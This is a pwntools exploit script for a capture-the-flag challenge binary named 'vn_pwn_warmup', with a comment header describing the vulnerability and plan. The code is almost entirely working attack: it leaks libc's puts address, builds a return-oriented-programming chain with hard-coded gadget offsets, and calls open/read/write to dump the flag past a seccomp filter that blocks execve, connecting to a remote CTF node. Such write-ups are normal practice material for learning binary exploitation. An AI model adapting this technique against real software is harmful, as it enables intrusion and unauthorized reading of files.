# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    seccomp: execve and fork are disallowed, one gadget is not available
exp: 0x10 bytes buffer overflow in sub_9A1
1. leak libc by puts address
2. buffer overflow return to ROP chain (the buf local_var in sub_9A1 is adjacent to buf local_var in sub_9D3)
3. open read and write to get flag through libc.bss
'''
from pwn import *

# define the context
binary_name = './vn_pwn_warmup'
libc_name = './ubuntu16-libc-2.23-x64.so' if args.REMOTE \
    else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 28639)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x00000000000009A1
        c
    """, aslr=False)
else:
    io = process(binary_name)

# exploiting code
ru(b'gift: ')
libc_puts = int(ru(b'\n', drop=True), 16)
libc.address = libc_puts - libc.sym.puts
log.info(f'libc puts: {hex(libc_puts)}')
log.info(f'libc base: {hex(libc.address)}')

pop_rdi_addr = libc.address
pop_rsi_addr = libc.address
pop_rdx_addr = libc.address
pop_rdi_addr += 0x0000000000021102 if args.REMOTE else 0x0000000000021112
pop_rsi_addr += 0x00000000000202e8 if args.REMOTE else 0x00000000000202f8
pop_rdx_addr += 0x0000000000001b92 if args.REMOTE else 0x0000000000001b92

payload = flat(
    0,
    pop_rsi_addr, libc.bss(),
    pop_rdx_addr, 0x100,
    libc.sym.read, # read(0, libc.bss, 0x100)
    pop_rdi_addr, libc.bss(),
    pop_rsi_addr, 0,
    libc.sym.open, # open('flag', 0)
    pop_rdi_addr, 3,
    pop_rsi_addr, libc.bss(),
    pop_rdx_addr, 0x100,
    libc.sym.read, # read(3, libc.bss, 0x100)
    pop_rdi_addr, 1,
    pop_rsi_addr, libc.bss(),
    pop_rdx_addr, 0x100,
    libc.sym.write
)
sla(b'Input something: ', payload)

payload = cyclic(112) + p64(0xfa1c4233) + p64(pop_rdi_addr)
sa(b"What's your name?", payload) # note: no '\n' in the end
sn(b'flag')

# interact with the shell
io.interactive()
